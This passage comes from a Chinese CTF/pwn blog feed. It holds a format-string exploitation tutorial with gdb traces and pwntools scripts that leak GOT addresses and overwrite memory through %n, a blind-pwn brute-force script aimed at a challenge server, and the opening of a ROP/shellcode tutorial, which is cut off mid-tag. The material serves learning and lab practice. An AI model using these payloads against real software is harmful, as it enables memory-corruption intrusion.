esp,0x20<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffcfb0 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span> //函数参数10008<span class="token operator">|</span> 0xffffcfb4 --<span class="token operator">></span> 0x1    //函数参数20012<span class="token operator">|</span> 0xffffcfb8 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377\320\317\377\377\320\317\377\377\020\364\374\367\235\204\004\b%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>    //函数参数30016<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0xffffffff  //函数参数4.。。。。0020<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 继续：0xf7e2db60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f11c79   0xf7e2db65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e2db6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e2db6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e2db73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffcfbc --<span class="token operator">></span> 0x80484f9 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+115<span class="token operator">></span>:    add    esp,0x10<span class="token punctuation">)</span> //第二次调用，返回地址0004<span class="token operator">|</span> 0xffffcfc0 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>  //函参10008<span class="token operator">|</span> 0xffffcfc4 --<span class="token operator">></span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>  // 2   （格式化参数1。。。）0012<span class="token operator">|</span> 0xffffcfc8 --<span class="token operator">></span> 0xf7fcf410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span>    //30016<span class="token operator">|</span> 0xffffcfcc --<span class="token operator">></span> 0x804849d <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+23<span class="token operator">></span>:    add    ebx,0x1b63<span class="token punctuation">)</span>   //40020<span class="token operator">|</span> 0xffffcfd0 <span class="token punctuation">(</span><span class="token string">"%3<span class="token variable">$x</span>"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffcfd4 --<span class="token operator">></span> 0x0 0028<span class="token operator">|</span> 0xffffcfd8 --<span class="token operator">></span> 0xf7ffd940 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e2db60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 以此判断程序将输出0x804849d：gdb-peda$ cContinuing.804849d<span class="token punctuation">[</span>Inferior 1 <span class="token punctuation">(</span>process 9897<span class="token punctuation">)</span> exited normally<span class="token punctuation">]</span></code></pre><p>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</p><p>小结：</p><pre><code>    利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。    利用 %s 来获取变量所对应地址的内容，只不过有零截断。    利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</code></pre><p>3：泄露任意地址内存<br>有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了</p><p>一般来说我们所读取的变量值都是在栈上的，因为是某个函数的局部变量。</p><p>由于我们可以控制格式化字符串，如果我们知道输出函数调用时我们的格式化字符串是第几个参数就可以构造特定形式来获取某些addr，如：p32（addr）%K$s<br>我们可以用下面的方法确定参数偏移：<br>[tag]%p%p%p%p%p%p…</p><p>如：</p><pre class=" language-bash"><code class="language-bash">AAAA%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%pAAAA0xff99da800xf7f814100x804849d0x414141410x702570250x702570250x702570250x70257025</code></pre><p>所以得到参数位置是5，是格式化字符串的第4个参数</p><p>现在我们可以来访问某些函数的地址如scanf函数，首先找到其got地址<br>利用pwntools得：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"test1"</span><span class="token punctuation">)</span>scanf_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>scanf_got<span class="token punctuation">)</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>scanf_got<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%4$s'</span><span class="token keyword">print</span> payloadgdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>   <span class="token operator">//</span>进一步调试sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"%4$s\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>在脚本启动gdb后先finih直到main函数然后在printf下断点。</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">=</span><span class="token operator">></span> 0xf7e25b60 <span class="token operator">&lt;</span>printf<span class="token operator">></span>:    call   0xf7f09c79   0xf7e25b65 <span class="token operator">&lt;</span>printf+5<span class="token operator">></span>:        add    eax,0x18449b   0xf7e25b6a <span class="token operator">&lt;</span>printf+10<span class="token operator">></span>:    sub    esp,0xc   0xf7e25b6d <span class="token operator">&lt;</span>printf+13<span class="token operator">></span>:        mov    eax,DWORD PTR <span class="token punctuation">[</span>eax-0x7c<span class="token punctuation">]</span>   0xf7e25b73 <span class="token operator">&lt;</span>printf+19<span class="token operator">></span>:        lea    edx,<span class="token punctuation">[</span>esp+0x14<span class="token punctuation">]</span>No argument<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffefdd2c --<span class="token operator">></span> 0x80484ea <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+100<span class="token operator">></span>:    add    esp,0x20<span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffefdd30 --<span class="token operator">></span> 0x8048593 <span class="token punctuation">(</span><span class="token string">"%08x.%08x.%08x.%s\n"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffefdd34 --<span class="token operator">></span> 0x1 0012<span class="token operator">|</span> 0xffefdd38 <span class="token punctuation">(</span><span class="token string">"\"\"\"\"\377\377\377\377P\335\357\377P\335\357\377\020t\374\367\235\204\004\b\024\240\004\b%4<span class="token variable">$s</span>"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffefdd3c --<span class="token operator">></span> 0xffffffff 0020<span class="token operator">|</span> 0xffefdd40 --<span class="token operator">></span> 0xffefdd50 --<span class="token operator">></span> 0x804a014 --<span class="token operator">></span> 0xf7e38410 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>:    push   ebp<span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffefdd44 --<span class="token operator">></span> 0xffefdd50 --<span class="token operator">></span> 0x804a014 --<span class="token operator">></span> 0xf7e38410 <span class="token punctuation">(</span><span class="token operator">&lt;</span>__isoc99_scanf<span class="token operator">></span>:    push   ebp<span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffefdd48 --<span class="token operator">></span> 0xf7fc7410 --<span class="token operator">></span> 0x8048278 <span class="token punctuation">(</span><span class="token string">"GLIBC_2.0"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueBreakpoint 1, 0xf7e25b60 <span class="token keyword">in</span> <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>   from /lib32/libc.so.6gdb-peda$ 可以看到第4个参数确实是scanf的在libc库中的地址在调试结束后的terminal可以得到scanf的地址：0x804a014\x14\x04%4<span class="token variable">$s</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> running <span class="token keyword">in</span> new terminal: /usr/bin/gdb -q  <span class="token string">"./test1"</span> 11351 -x <span class="token string">"/tmp/pwn7ki8h7.gdb"</span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> debugger: Done0xf7d5e410<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./test1'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 11351<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><p>有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字(32位4，64位8）长整数倍的地址处，一般来说，类似于下面的这个样子。<br>[padding][addr][padding]</p><p>4：内存覆盖<br>只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值：%n,<br>%n不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</p><p>程序：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">789</span><span class="token punctuation">;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified c."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified a for a small number."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> <span class="token number">0x12345678</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"modified b for a big number!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>基本构造格式如下：<br>…[overwrite addr]….%[overwrite offset]$n<br>其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数<br>步骤：<br>    确定覆盖地址<br>    确定相对偏移<br>    进行覆盖</p><p>确定覆盖地址：首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。</p><p>确定相对偏移：其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()<br>hunter@hunter:~/PWN/formal/wiki$ ./test2<br>0xffebe8ac<br>AAAA%p%p%p%p%p%p%p%p%p<br>AAAA0xffebe8480xf7ef14100x80484bd(nil)0x10x414141410x702570250x702570250x70257025<br>所以是第7 个参数  =》  n为6</p><p>进行覆盖：<br>将c的地址放在n=6，然后利用%n来修改c的值<br>[addr of c]%012d%6$n    //addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。</p><p><strong>注意：如果地址没有在或者不能放在第一个位置时，要注意我们的地址作为printf的参数是第几个</strong><br><img src="https://s1.ax1x.com/2020/07/05/USf2tO.png" alt=""></p><p>Exp：</p><pre class=" language-python"><code class="language-python">    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>    c_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#drop ：是否保留</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>c_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'%012d'</span> <span class="token operator">+</span> <span class="token string">'%6$n'</span>    <span class="token keyword">print</span> payload    <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>覆盖小数字：<br>下面的问题是将a改为2  因为a是全局变量，在data段地址可从ida获取<br>这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。  （或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。）</p><p>我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是：aa%k$naa  刚好占8字节所以我们的地址被挤到第n=8个参数</p><p>利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。</p><p>.data:0804A024                 public a<br>.data:0804A024 a               dd 7Bh</p><p>故而我们可以构造如下的利用代码</p><pre class=" language-python"><code class="language-python">    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'test2'</span><span class="token punctuation">)</span>    a_addr <span class="token operator">=</span> <span class="token number">0x0804A024</span>    payload <span class="token operator">=</span> <span class="token string">'aa%8$naa'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>a_addr<span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。</p><p>覆盖大数字<br>我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12</p><p>首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。</p><p>.data:0804A028                 public b<br>.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</p><p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p><p>0x0804A028 \x78<br>0x0804A029 \x56<br>0x0804A02a \x34<br>0x0804A02b \x12</p><p>这里将构造一个推算代码：（本人不懂）</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span></code></pre><pre><code>offset 表示要覆盖的地址最初的偏移size 表示机器字长addr 表示将要覆盖的地址。target 表示我们要覆盖为的目的变量值。</code></pre><p>这其实就是pwntools的一个模块：当要写入很大的数时可以用pwntools的fmtstr模块：我们希望向0x08048000写入值0x10203040，在pwntools里，我们可以用命令fmtstr_payload。<br>payload = fmtstr_payload(6,{0x08048000:0x10203040}) // 即可 ， 6是偏移量。</p><p>详情:<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf进阶-pwn-warmup</title>
      <link href="/2020/05/16/xctf-jin-jie-pwn-warmup/"/>
      <url>/2020/05/16/xctf-jin-jie-pwn-warmup/</url>
      
        <content type="html"><![CDATA[<p>这个提没有附件，被称为盲打，blind pwn<br><img src="https://s1.ax1x.com/2020/05/23/YjvFy9.png" alt=""></p><p>黑箱测试之类的。</p><p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p><p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p><p>exp爆破：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>addr <span class="token operator">=</span> <span class="token number">0x40060d</span>    <span class="token comment" spellcheck="true">#地址可能是p32 也可能是p64</span><span class="token keyword">def</span> <span class="token function">fuzz</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> num<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。</span>    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> num    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.200.240.241"</span><span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">)</span>                fuzz<span class="token punctuation">(</span>r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>                text <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'text.len='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'text='</span><span class="token operator">+</span>text<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'num='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' flag='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>                r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#except为空则try语句中出现任何错误都会执行r.close()</span>                r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-challenge </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP_x86</title>
      <link href="/2020/04/23/rop-x86/"/>
      <url>/2020/04/23/rop-x86/</url>
      
        <content type="html"><![CDATA[<h2 id="ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"><a href="#ROP的全称为Return-oriented-programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。" class="headerlink" title="ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。"></a>ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。</h2><h3 id="Control-Flow-Hijack-程序流劫持"><a href="#Control-Flow-Hijack-程序流劫持" class="headerlink" title="Control Flow Hijack 程序流劫持"></a>Control Flow Hijack 程序流劫持</h3><p>比较常见的程序流劫持就是栈溢出，格式化字符串攻击和堆溢出了。通过程序流劫持，攻击者可以控制PC指针从而执行目标代码。为了应对这种攻击，系统防御者也提出了各种防御方法，最常见的方法有DEP（堆栈不可执行），ASLR（内存地址随机化），Stack Protector（栈保护）等。</p><p>level1：无防护32位<br>ida伪代码：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>进入vulnerable（危险）函数：<br><img src="https://s1.ax1x.com/2020/05/23/YvFWpq.png" alt=""></p><p>从char buf （后面的注释）这一段可知其大小大概为0x88+0x10.<br>下面的read函数256u表示允许读入256个字符，显然存在溢出。<br>进入buf：<br><img src="https://s1.ax1x.com/2020/05/23/YvkNbF.png" alt=""><br>所以（下面的没截下来）buf可放入0x88+0x8个字符（140），还可以通过调试进一步验证。</p><h3 id="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"><a href="#那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。" class="headerlink" title="那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。"></a>那么既然啥防护都没开我们的思路就很清晰了：编写对应的shellcode填入栈中，栈中剩余的空间随便填满，直到改变返回地址，并将返回地址改为我们shellcode的首地址。</h3><h2 id="调试："><a href="#调试：" class="headerlink" title="调试："></a>调试：</h2><p>在read函数时制造200个字符：<br><img 